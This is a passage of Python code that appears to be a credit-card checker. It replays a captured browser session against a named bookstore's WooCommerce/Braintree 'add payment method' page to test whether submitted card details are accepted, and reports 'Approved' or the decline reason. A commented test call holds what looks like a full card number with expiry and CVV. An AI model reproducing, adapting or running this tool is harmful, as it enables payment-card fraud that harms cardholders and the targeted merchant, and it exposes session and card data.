_ga_V0NJJNMC5C=GS1.1.1708380760.1.1.1708380959.0.0.0; _ga=GA1.1.719100388.1708380759; _monsterinsights_uj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380791":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8"}; _wpfuj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8"}; _ga_XP86HLTBHS=GS1.1.1708380758.1.1.1708381336.39.0.0; _ga_53ZS64GYMY=GS1.1.1708380759.1.1.1708381348.60.0.0; _ga_3D7WE1E62Q=GS1.1.1708380759.1.1.1708381348.0.0.0; _ga_3QYEEL2PZ2=GS1.1.1708380759.1.1.1708381348.0.0.0',
    'Origin': 'https://rockynook.com',
    'Referer': 'https://rockynook.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', ty),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', token),
    ('wc_braintree_device_data', '{"correlation_id":"c194d37e0edb8a863fce1510497adc0c"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"c194d37e0edb8a863fce1510497adc0c"}'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', pay),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = r.post('https://rockynook.com/my-account/add-payment-method/', headers=headers, data=data)
	if 'wc-block-components-notice-banner__content' in response.text:
		soup = BeautifulSoup(response.text, 'html.parser')
		msg = soup.find("div", class_="wc-block-components-notice-banner__content").get_text().strip()
		if 'Status code ' in msg:
			msg = msg.replace('Status code ','')
		else:
			msg = msg
		return msg
	elif 'Nice! New payment method added' in response.text:
		msg = 'Approved'
		return msg
	else:
		return 'error'
#print(br3('5466042035522869|07|28|538'))